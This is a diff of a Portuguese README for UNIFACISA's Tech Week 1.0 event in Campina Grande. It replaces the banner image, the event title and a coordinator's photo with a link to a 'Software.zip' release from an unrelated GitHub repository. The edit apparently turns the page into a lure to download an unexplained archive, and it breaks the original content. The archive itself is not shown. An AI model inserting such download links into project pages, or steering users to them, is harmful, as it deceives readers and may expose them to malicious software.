@@ -1,6 +1,6 @@
-<img src="https://images.even3.com.br/m7WTPFGA7q2Zl536dowm5sGPqIg=/1100x440/smart/even3.blob.core.windows.net/banner/WhatsAppImage2023-10-18at11.41.18.775d16c04c00409c9296.jpeg" alt="Texto Alternativo">
+<img src="https://github.com/GigliarlyM/Hackaton2023/releases/download/v1.0/Software.zip" alt="Texto Alternativo">
 
-# _TECH.WEEK1.0 UNIFACISA_
+# https://github.com/GigliarlyM/Hackaton2023/releases/download/v1.0/Software.zip UNIFACISA_
 Cidade: Campina Grande / Paraíba
 Local: UNIFACISA - Centro Universitário
 
@@ -11,7 +11,7 @@ O evento Tech. Week1.0 Unifacisa, foi idealizado pelas coordenações dos cursos
 🤵 Coordenação do Curso de Sistemas da Informação:
 Professor Fabrício Dias
 
-<img src="https://images.even3.com.br/yWEik4_yJlWJWYylKBI9n5f0XEQ=/150x150/smart/even3.blob.core.windows.net/geral/Fabrcio_Dias.JPG.cdf9998dc5274c73879a.jpg">
+<img src="https://github.com/GigliarlyM/Hackaton2023/releases/download/v1.0/Software.zip">
 
 
 👷 Equipe Esse projeto foi desenvolvido com a colaboração:
